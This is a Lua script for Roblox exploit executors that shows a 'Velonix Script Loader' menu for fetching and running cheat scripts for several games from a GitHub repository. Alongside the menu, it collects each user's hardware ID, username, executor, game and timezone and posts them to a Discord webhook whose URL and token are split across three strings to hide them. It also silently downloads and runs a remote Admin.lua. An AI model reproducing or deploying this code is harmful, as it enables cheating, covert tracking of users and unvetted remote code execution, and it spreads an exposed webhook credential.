--// SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local Debris = game:GetService("Debris")

--// VARIABLES
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Webhook Setup
local WEBHOOK1 = "https://discord.com/"
local WEBHOOK2 = "api/webhooks"
local WEBHOOK3 = "1393398736344055930/G90Hkhf7jtSpyLc8SYE7t60DwxiwzfCw1EiQED84T163EdvDhRtuL5RzmEHp9Fq0R3UM"
local WEBHOOK_URL = WEBHOOK1 .. WEBHOOK2 .. "/" .. WEBHOOK3

-- Supported Scripts
local LOADER_SCRIPTS = {
    ["🌱 Grow a Garden"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/GAG.lua",
    ["⚔️ The Strongest Battleground"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/TSB.lua",
    ["🗡️ Steal a Sword"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/SAS.lua",
    ["🔨 Flee The Facility"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/FTF.lua",
    ["💂 Ink Game"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/IG.lua",  
    ["🚢 Naval Warfare"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/NW.lua",
    ["🪖 Underground War"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/UW.lua",
    ["🌐 Universal Script"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/UNIV.lua"
}

local BLACKLIST = {
    ["HWID_HERE"] = true
}

-- HWID Grabber
local function getHWID()
    return (gethwid and gethwid())
        or (getgenv and getgenv().hwid)
        or (identifyexecutor and tostring(identifyexecutor()):gsub("%W", ""))
        or game:GetService("RbxAnalyticsService"):GetClientId()
end

-- Blacklist
local hwid = getHWID()
if BLACKLIST[hwid] then
    player:Kick("Blacklisted.")
    return
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "VelonixLoader"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 300, 0, 320)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "Velonix Script Loader"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", mainFrame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
closeBtn.BorderSizePixel = 0
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
scrollFrame.Size = UDim2.new(1, -40, 1, -60)
scrollFrame.Position = UDim2.new(0, 20, 0, 50)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.ClipsDescendants = true
Instance.new("UIPadding", scrollFrame).PaddingBottom = UDim.new(0, 10)

local layout = Instance.new("UIListLayout", scrollFrame)
layout.Padding = UDim.new(0, 10)
layout.SortOrder = Enum.SortOrder.LayoutOrder

local function addScriptButton(name, url)
    local btn = Instance.new("TextButton", scrollFrame)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.TextColor3 = url and Color3.new(1,1,1) or Color3.fromRGB(170,170,170)
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    btn.Active = url ~= nil

    btn.MouseButton1Click:Connect(function()
        if not url then return warn(name .. " is coming soon!") end
        local ok, err = pcall(function()
            local script = game:HttpGet(url)
            loadstring(script)()
        end)
        if not ok then warn("Load failed:", err) else mainFrame.Visible = false end
    end)
end

for name, url in pairs(LOADER_SCRIPTS) do
    addScriptButton(name, url)
end

--// Execution Logger
spawn(function()
    local req = (syn and syn.request) or (http and http.request) or request
    if typeof(req) ~= "function" then warn("No valid request method.") return end

    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
    local gameName = "Unknown"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local payload = {
        username = "🔥 | Developer",
        embeds = {{
            title = "🚨 New Script Execution",
            description = string.format("**Username:** `%s`\n**Executor:** `%s`\n**HWID:** `%s`\n**Game:** `%s` (%d)\n**Timezone:** `%s`",
                player.Name, executor, hwid,
                gameName, game.PlaceId,
                os.date("%Z")
            ),
            color = 15158332,
            footer = { text = "Velonix Loader • " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local ok, res = pcall(function()
        return req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not ok then
        warn("API request failed:", res)
    elseif not res.Success then
        warn("API response error:", res.StatusCode)
    end
end)
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/Admin.lua"))()
-- Developer Notification
local DevRoles = {
    [1489467751] = "C9_1234",
    [4688179501] = "0947is",
    [8481531471] = "Nov",
    [3489668970] = "goodGamerYT",
    [8910853649] = "Zero"
}

local function playCheerSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://138087017"
    sound.Volume = 5
    sound.Parent = SoundService
    sound:Play()
    Debris:AddItem(sound, 5)
end

local function displayNotification(userName)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = userName .. " here!",
            Text = "Developer of the script is on this server",
            Icon = 'rbxassetid://7247105391',
            Duration = 10,
        })
    end)
    playCheerSound()
end

local function checkAndNotify(player)
    if player ~= Players.LocalPlayer then
        local devName = DevRoles[player.UserId]
        if devName then
            displayNotification(devName)
        end
    end
end

for _, plr in ipairs(Players:GetPlayers()) do
    checkAndNotify(plr)
end

Players.PlayerAdded:Connect(checkAndNotify)
